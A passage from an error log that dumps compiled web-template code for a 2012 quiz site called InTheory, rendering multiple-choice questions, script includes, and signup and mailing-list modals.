170      _append('", "')  # home.html:21 (via base.html:76)
171      _tmp = kwargs["questions"][3].options[2]  # home.html:21 (via base.html:76)
172      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
173      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
174      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
175      _append(_tmp)  # home.html:21 (via base.html:76)
176      _append('", "')  # home.html:21 (via base.html:76)
177      _tmp = kwargs["questions"][3].options[3]  # home.html:21 (via base.html:76)
178      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
179      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
180      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
181      _append(_tmp)  # home.html:21 (via base.html:76)
182      _append('"],"answer": ')  # home.html:21 (via base.html:76)
183      _tmp = kwargs["questions"][3].answer  # home.html:21 (via base.html:76)
184      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
185      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
186      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
187      _append(_tmp)  # home.html:21 (via base.html:76)
188      _append('}, { "question":"')  # home.html:21 (via base.html:76)
189      _tmp = kwargs["questions"][4].question  # home.html:21 (via base.html:76)
190      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
191      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
192      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
193      _append(_tmp)  # home.html:21 (via base.html:76)
194      _append('","options": ["')  # home.html:21 (via base.html:76)
195      _tmp = kwargs["questions"][4].options[0]  # home.html:21 (via base.html:76)
196      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
197      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
198      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
199      _append(_tmp)  # home.html:21 (via base.html:76)
200      _append('", "')  # home.html:21 (via base.html:76)
201      _tmp = kwargs["questions"][4].options[1]  # home.html:21 (via base.html:76)
202      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
203      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
204      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
205      _append(_tmp)  # home.html:21 (via base.html:76)
206      _append('", "')  # home.html:21 (via base.html:76)
207      _tmp = kwargs["questions"][4].options[2]  # home.html:21 (via base.html:76)
208      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
209      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
210      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
211      _append(_tmp)  # home.html:21 (via base.html:76)
212      _append('", "')  # home.html:21 (via base.html:76)
213      _tmp = kwargs["questions"][4].options[3]  # home.html:21 (via base.html:76)
214      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
215      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
216      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
217      _append(_tmp)  # home.html:21 (via base.html:76)
218      _append('"],"answer": ')  # home.html:21 (via base.html:76)
219      _tmp = kwargs["questions"][4].answer  # home.html:21 (via base.html:76)
220      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
221      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
222      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
223      _append(_tmp)  # home.html:21 (via base.html:76)
224      _append('},{ "question":"')  # home.html:21 (via base.html:76)
225      _tmp = kwargs["questions"][5].question  # home.html:21 (via base.html:76)
226      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
227      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
228      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
229      _append(_tmp)  # home.html:21 (via base.html:76)
230      _append('","options": ["')  # home.html:21 (via base.html:76)
231      _tmp = kwargs["questions"][5].options[0]  # home.html:21 (via base.html:76)
232      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
233      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
234      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
235      _append(_tmp)  # home.html:21 (via base.html:76)
236      _append('", "')  # home.html:21 (via base.html:76)
237      _tmp = kwargs["questions"][5].options[1]  # home.html:21 (via base.html:76)
238      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
239      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
240      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
241      _append(_tmp)  # home.html:21 (via base.html:76)
242      _append('", "')  # home.html:21 (via base.html:76)
243      _tmp = kwargs["questions"][5].options[2]  # home.html:21 (via base.html:76)
244      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
245      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
246      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
247      _append(_tmp)  # home.html:21 (via base.html:76)
248      _append('", "')  # home.html:21 (via base.html:76)
249      _tmp = kwargs["questions"][5].options[3]  # home.html:21 (via base.html:76)
250      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
251      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
252      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
253      _append(_tmp)  # home.html:21 (via base.html:76)
254      _append('"],"answer": ')  # home.html:21 (via base.html:76)
255      _tmp = kwargs["questions"][5].answer  # home.html:21 (via base.html:76)
256      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
257      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
258      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
259      _append(_tmp)  # home.html:21 (via base.html:76)
260      _append('}, { "question":"')  # home.html:21 (via base.html:76)
261      _tmp = kwargs["questions"][6].question  # home.html:21 (via base.html:76)
262      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
263      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
264      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
265      _append(_tmp)  # home.html:21 (via base.html:76)
266      _append('","options": ["')  # home.html:21 (via base.html:76)
267      _tmp = kwargs["questions"][6].options[0]  # home.html:21 (via base.html:76)
268      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
269      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
270      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
271      _append(_tmp)  # home.html:21 (via base.html:76)
272      _append('", "')  # home.html:21 (via base.html:76)
273      _tmp = kwargs["questions"][6].options[1]  # home.html:21 (via base.html:76)
274      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
275      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
276      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
277      _append(_tmp)  # home.html:21 (via base.html:76)
278      _append('", "')  # home.html:21 (via base.html:76)
279      _tmp = kwargs["questions"][6].options[2]  # home.html:21 (via base.html:76)
280      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
281      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
282      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
283      _append(_tmp)  # home.html:21 (via base.html:76)
284      _append('", "')  # home.html:21 (via base.html:76)
285      _tmp = kwargs["questions"][6].options[3]  # home.html:21 (via base.html:76)
286      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
287      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
288      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
289      _append(_tmp)  # home.html:21 (via base.html:76)
290      _append('"],"answer": ')  # home.html:21 (via base.html:76)
291      _tmp = kwargs["questions"][6].answer  # home.html:21 (via base.html:76)
292      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
293      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
294      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
295      _append(_tmp)  # home.html:21 (via base.html:76)
296      _append('},{ "question":"')  # home.html:21 (via base.html:76)
297      _tmp = kwargs["questions"][7].question  # home.html:21 (via base.html:76)
298      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
299      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
300      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
301      _append(_tmp)  # home.html:21 (via base.html:76)
302      _append('","options": ["')  # home.html:21 (via base.html:76)
303      _tmp = kwargs["questions"][7].options[0]  # home.html:21 (via base.html:76)
304      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
305      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
306      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
307      _append(_tmp)  # home.html:21 (via base.html:76)
308      _append('", "')  # home.html:21 (via base.html:76)
309      _tmp = kwargs["questions"][7].options[1]  # home.html:21 (via base.html:76)
310      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
311      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
312      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
313      _append(_tmp)  # home.html:21 (via base.html:76)
314      _append('", "')  # home.html:21 (via base.html:76)
315      _tmp = kwargs["questions"][7].options[2]  # home.html:21 (via base.html:76)
316      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
317      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
318      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
319      _append(_tmp)  # home.html:21 (via base.html:76)
320      _append('", "')  # home.html:21 (via base.html:76)
321      _tmp = kwargs["questions"][7].options[3]  # home.html:21 (via base.html:76)
322      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
323      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
324      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
325      _append(_tmp)  # home.html:21 (via base.html:76)
326      _append('"],"answer": ')  # home.html:21 (via base.html:76)
327      _tmp = kwargs["questions"][7].answer  # home.html:21 (via base.html:76)
328      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
329      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
330      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
331      _append(_tmp)  # home.html:21 (via base.html:76)
332      _append('}, { "question":"')  # home.html:21 (via base.html:76)
333      _tmp = kwargs["questions"][8].question  # home.html:21 (via base.html:76)
334      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
335      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
336      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
337      _append(_tmp)  # home.html:21 (via base.html:76)
338      _append('","options": ["')  # home.html:21 (via base.html:76)
339      _tmp = kwargs["questions"][8].options[0]  # home.html:21 (via base.html:76)
340      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
341      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
342      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
343      _append(_tmp)  # home.html:21 (via base.html:76)
344      _append('", "')  # home.html:21 (via base.html:76)
345      _tmp = kwargs["questions"][8].options[1]  # home.html:21 (via base.html:76)
346      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
347      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
348      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
349      _append(_tmp)  # home.html:21 (via base.html:76)
350      _append('", "')  # home.html:21 (via base.html:76)
351      _tmp = kwargs["questions"][8].options[2]  # home.html:21 (via base.html:76)
352      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
353      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
354      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
355      _append(_tmp)  # home.html:21 (via base.html:76)
356      _append('", "')  # home.html:21 (via base.html:76)
357      _tmp = kwargs["questions"][8].options[3]  # home.html:21 (via base.html:76)
358      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
359      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
360      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
361      _append(_tmp)  # home.html:21 (via base.html:76)
362      _append('"],"answer": ')  # home.html:21 (via base.html:76)
363      _tmp = kwargs["questions"][8].answer  # home.html:21 (via base.html:76)
364      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
365      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
366      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
367      _append(_tmp)  # home.html:21 (via base.html:76)
368      _append('},{ "question":"')  # home.html:21 (via base.html:76)
369      _tmp = kwargs["questions"][9].question  # home.html:21 (via base.html:76)
370      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
371      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
372      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
373      _append(_tmp)  # home.html:21 (via base.html:76)
374      _append('","options": ["')  # home.html:21 (via base.html:76)
375      _tmp = kwargs["questions"][9].options[0]  # home.html:21 (via base.html:76)
376      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
377      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
378      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
379      _append(_tmp)  # home.html:21 (via base.html:76)
380      _append('", "')  # home.html:21 (via base.html:76)
381      _tmp = kwargs["questions"][9].options[1]  # home.html:21 (via base.html:76)
382      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
383      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
384      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
385      _append(_tmp)  # home.html:21 (via base.html:76)
386      _append('", "')  # home.html:21 (via base.html:76)
387      _tmp = kwargs["questions"][9].options[2]  # home.html:21 (via base.html:76)
388      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
389      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
390      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
391      _append(_tmp)  # home.html:21 (via base.html:76)
392      _append('", "')  # home.html:21 (via base.html:76)
393      _tmp = kwargs["questions"][9].options[3]  # home.html:21 (via base.html:76)
394      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
395      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
396      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
397      _append(_tmp)  # home.html:21 (via base.html:76)
398      _append('"],"answer": ')  # home.html:21 (via base.html:76)
399      _tmp = kwargs["questions"][9].answer  # home.html:21 (via base.html:76)
400      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
401      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
402      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
403      _append(_tmp)  # home.html:21 (via base.html:76)
404      _append('}]\'>\n</div>\n<div id="answers" data-answers=\'[]\'></div>\n<div id="mini-quiz-box" class="undimmed">\n')  # home.html:25 (via base.html:76)
405      question = kwargs['questions'][0]  # home.html:25 (via base.html:76)
406      _append('\n<h4> ')  # home.html:26 (via base.html:76)
407      _tmp = question.question  # home.html:26 (via base.html:76)
408      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:26 (via base.html:76)
409      else: _tmp = _utf8(str(_tmp))  # home.html:26 (via base.html:76)
410      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:26 (via base.html:76)
411      _append(_tmp)  # home.html:26 (via base.html:76)
412      _append('</h4>\n<ul remaining-answers=')  # home.html:27 (via base.html:76)
413      _tmp = len(question.answer)  # home.html:27 (via base.html:76)
414      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:27 (via base.html:76)
415      else: _tmp = _utf8(str(_tmp))  # home.html:27 (via base.html:76)
416      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:27 (via base.html:76)
417      _append(_tmp)  # home.html:27 (via base.html:76)
418      _append(' class="nav nav-pills nav-stacked">\n<li><a class="choice" ind="0"><span class="badge badge-info">A</span> ')  # home.html:28 (via base.html:76)
419      _tmp = question.options[0]  # home.html:28 (via base.html:76)
420      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:28 (via base.html:76)
421      else: _tmp = _utf8(str(_tmp))  # home.html:28 (via base.html:76)
422      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:28 (via base.html:76)
423      _append(_tmp)  # home.html:28 (via base.html:76)
424      _append('</a></li>\n<li><a class="choice" ind="1"><span class="badge badge-info">B</span> ')  # home.html:29 (via base.html:76)
425      _tmp = question.options[1]  # home.html:29 (via base.html:76)
426      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:29 (via base.html:76)
427      else: _tmp = _utf8(str(_tmp))  # home.html:29 (via base.html:76)
428      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:29 (via base.html:76)
429      _append(_tmp)  # home.html:29 (via base.html:76)
430      _append('</a></li>\n<li><a class="choice" ind="2"><span class="badge badge-info">C</span> ')  # home.html:30 (via base.html:76)
431      _tmp = question.options[2]  # home.html:30 (via base.html:76)
432      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:30 (via base.html:76)
433      else: _tmp = _utf8(str(_tmp))  # home.html:30 (via base.html:76)
434      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:30 (via base.html:76)
435      _append(_tmp)  # home.html:30 (via base.html:76)
436      _append('</a></li>\n<li><a class="choice" ind="3"><span class="badge badge-info">D</span> ')  # home.html:31 (via base.html:76)
437      _tmp = question.options[3]  # home.html:31 (via base.html:76)
438      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:31 (via base.html:76)
439      else: _tmp = _utf8(str(_tmp))  # home.html:31 (via base.html:76)
440      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:31 (via base.html:76)
441      _append(_tmp)  # home.html:31 (via base.html:76)
442      _append('</a></li>\n</ul>\n<a id="next" class="btn btn-success btn-mini disabled">Next Question</a>\n</div>\n</div>\n</div>\n</div>\n</div>\n<div class="row">\n<div class="span10">\n</div>\n<div class="span5 offset5">\n</br></br>\n<blockquote>\n<p>\n<h2><div class="funkytext"><font color="#ffffff">"')  # home.html:47 (via base.html:76)
443      _tmp = kwargs['tweet']  # home.html:47 (via base.html:76)
444      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:47 (via base.html:76)
445      else: _tmp = _utf8(str(_tmp))  # home.html:47 (via base.html:76)
446      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:47 (via base.html:76)
447      _append(_tmp)  # home.html:47 (via base.html:76)
448      _append('"</h2>\n<div class="funkytext">- Dave Mason, London</font></div>\n</p>\n</blockquote>\n</div>\n</div>\n</div> <!-- /container -->\n<div id="dim">\n</div>\n')  # home.html:57 (via base.html:76)
449      _append('\n')  # base.html:80
450      _tmp = xsrf_form_html()  # base.html:80
451      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:80
452      else: _tmp = _utf8(str(_tmp))  # base.html:80
453      _append(_tmp)  # base.html:80
454      _append('\n')  # base.html:81
455      _append('\n<script src="')  # base.html:82 (via base.html:81)
456      _tmp = static_url('js/libs/jquery-1.7.2.min.js')  # base.html:82 (via base.html:81)
457      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:82 (via base.html:81)
458      else: _tmp = _utf8(str(_tmp))  # base.html:82 (via base.html:81)
459      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:82 (via base.html:81)
460      _append(_tmp)  # base.html:82 (via base.html:81)
461      _append('"></script>\n<script src="')  # base.html:83 (via base.html:81)
462      _tmp = static_url('js/libs/blurb.min.js')  # base.html:83 (via base.html:81)
463      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:83 (via base.html:81)
464      else: _tmp = _utf8(str(_tmp))  # base.html:83 (via base.html:81)
465      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:83 (via base.html:81)
466      _append(_tmp)  # base.html:83 (via base.html:81)
467      _append('"></script>\n<script src="')  # base.html:84 (via base.html:81)
468      _tmp = static_url('js/IT.js')  # base.html:84 (via base.html:81)
469      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:84 (via base.html:81)
470      else: _tmp = _utf8(str(_tmp))  # base.html:84 (via base.html:81)
471      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:84 (via base.html:81)
472      _append(_tmp)  # base.html:84 (via base.html:81)
473      _append('"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-dropdown.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-button.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-modal.js"></script>\n')  # base.html:88 (via base.html:81)
474      _append('\n')  # base.html:90
475      for js in kwargs['js_deps']:  # base.html:90
476          _append('\n<script src="')  # base.html:91
477          _tmp = static_url(js)  # base.html:91
478          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:91
479          else: _tmp = _utf8(str(_tmp))  # base.html:91
480          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:91
481          _append(_tmp)  # base.html:91
482          _append('"></script>\n')  # base.html:92
483      _append('\n')  # base.html:94
484      _append('\n<script id="signup-template" type="text/x-jquery-tmpl">\n<div id="windowTitleDialog" class="modal hide fade">\n<div class="modal-header">\n<a class="close">&times;</a>\n<h3>You scored ${score} out of 10!</h3>\n</div>\n<div class="modal-body">\n<p>You still need a little practice, but don\'t worry we\'re here to help you pass. Sign-up today to get started...</p>\n<a href="/login"><center><img src="')  # home.html:68 (via base.html:94)
485      _tmp = static_url('imgs/facebook.png')  # home.html:68 (via base.html:94)
486      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:68 (via base.html:94)
487      else: _tmp = _utf8(str(_tmp))  # home.html:68 (via base.html:94)
488      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:68 (via base.html:94)
489      _append(_tmp)  # home.html:68 (via base.html:94)
490      _append('" alt="some_text"/></a>\n<img src="')  # home.html:69 (via base.html:94)
491      _tmp = static_url('imgs/twitter.png')  # home.html:69 (via base.html:94)
492      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:69 (via base.html:94)
493      else: _tmp = _utf8(str(_tmp))  # home.html:69 (via base.html:94)
494      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:69 (via base.html:94)
495      _append(_tmp)  # home.html:69 (via base.html:94)
496      _append('" alt="some_text"/>\n<img src="')  # home.html:70 (via base.html:94)
497      _tmp = static_url('imgs/google.png')  # home.html:70 (via base.html:94)
498      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:70 (via base.html:94)
499      else: _tmp = _utf8(str(_tmp))  # home.html:70 (via base.html:94)
500      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:70 (via base.html:94)
501      _append(_tmp)  # home.html:70 (via base.html:94)
502      _append('" alt="some_text"/></center>\n<center><a href="h">Or click here to sign-up directly</a></center>\n</div>\n<div class="modal-footer">\n<ul class="pager">\n<li class="previous"><a href="#">Sign in to InTheory</a></li>\n<li class="next"><a href="#">Forgot username or password?</a></li>\n</ul>\n</div>\n</div>\n</script>\n<script id="show-arrow-template" type="text/x-jquery-tmpl">\n<div class="arrow-container">\n<img src="')  # home.html:84 (via base.html:94)
503      _tmp = static_url('imgs/arrow.png')  # home.html:84 (via base.html:94)
504      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:84 (via base.html:94)
505      else: _tmp = _utf8(str(_tmp))  # home.html:84 (via base.html:94)
506      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:84 (via base.html:94)
507      _append(_tmp)  # home.html:84 (via base.html:94)
508      _append('"/>\n</div>\n</script>\n<script id="email-template" type="text/x-jquery-tmpl">\n<div id="windowTitleDialog" class="modal hide fade">\n<div class="modal-header">\n<a class="close">&times;</a>\n<h3>You scored ${score} out of 10!</h3>\n</div>\n<div class="modal-body">\n<center>\n<p>Leave your email and we\'ll let you know when we launch!</p>\n<form method="post" class="af-form-wrapper" action="http://www.aweber.com/scripts/addlead.pl" >\n<div style="display: none;">\n<input type="hidden" name="meta_web_form_id" value="677441365" />\n<input type="hidden" name="meta_split_id" value="" />\n<input type="hidden" name="listname" value="intheory" />\n<input type="hidden" name="redirect" value="http://www.aweber.com/thankyou-coi.htm?m=video" id="redirect_b3be9783c304109a8d9d9ca013e7b651" />\n<input type="hidden" name="meta_adtracking" value="Waiting_List_/_Splash" />\n<input type="hidden" name="meta_message" value="1" />\n<input type="hidden" name="meta_required" value="name,email" />\n<input type="hidden" name="meta_tooltip" value="" />\n</div>\n<div id="af-form-677441365" class="af-form"><div id="af-body-677441365" class="af-body af-standards">\n<div class="af-element">\n<div class="af-textWrap"></br>\n<input id="awf_field-39151245" type="text" name="name" class="text" placeholder="Enter Your Name" tabindex="500" />\n</div>\n<div class="af-clear"></div></div>\n<div class="af-element">\n<div class="af-textWrap"><input class="text" id="awf_field-39151246" type="text" name="email" placeholder="Enter Your Email" tabindex="501" />\n</div><div class="af-clear"></div>\n</div>\n<input name="submit" class="btn btn-primaryw" type="submit" value="Submit" tabindex="502" />\n</br>\n<a href="/login">or connect with Facebook</a>\n</div>\n</br></br>\n<div class="af-element privacyPolicy" style="text-align: center"><p>We respect your <a title="Privacy Policy" href="http://www.aweber.com/permission.htm" target="_blank">email privacy</a></p>\n<div class="af-clear"></div>\n</div>\n</div>\n</div>\n<div style="display: none;"><img src="http://forms.aweber.com/form/displays.htm?id=bOzsLCyMzGys" alt="" /></div>\n</form>\n</center>\n<script type="text/javascript">\n<!--\n(function() {\nvar IE = /*@cc_on!@*/false;\nif (!IE) { return; }\nif (document.compatMode && document.compatMode == \'BackCompat\') {\nif (document.getElementById("af-form-677441365")) {\ndocument.getElementById("af-form-677441365").className = \'af-form af-quirksMode\';\n}\nif (document.getElementById("af-body-677441365")) {\ndocument.getElementById("af-body-677441365").className = "af-body inline af-quirksMode";\n}\nif (document.getElementById("af-header-677441365")) {\ndocument.getElementById("af-header-677441365").className = "af-header af-quirksMode";\n}\nif (document.getElementById("af-footer-677441365")) {\ndocument.getElementById("af-footer-677441365").className = "af-footer af-quirksMode";\n}\n}\n})();\n-->\n</script>\n</div>\n</div>\n</script>\n')  # home.html:158 (via base.html:94)
509      _append('\n<div class="container">\n<div class="footer"><font color="#FFFFFF" size="2px"> <p class="alignleft">InTheory Media Limited \xc2\xa9 2012</p>\n<p class="alignright">About Us | Terms & Conditions | Privacy Policy | Support </p></font></br>\n</div>\n</div>\n</body>\n</html>\n')  # base.html:106
510      return _utf8('').join(_buffer)  # base.html:0
ERROR:root:home.html code:
  1  def _execute():  # base.html:0
  2      _buffer = []  # base.html:0
  3      _append = _buffer.append  # base.html:0
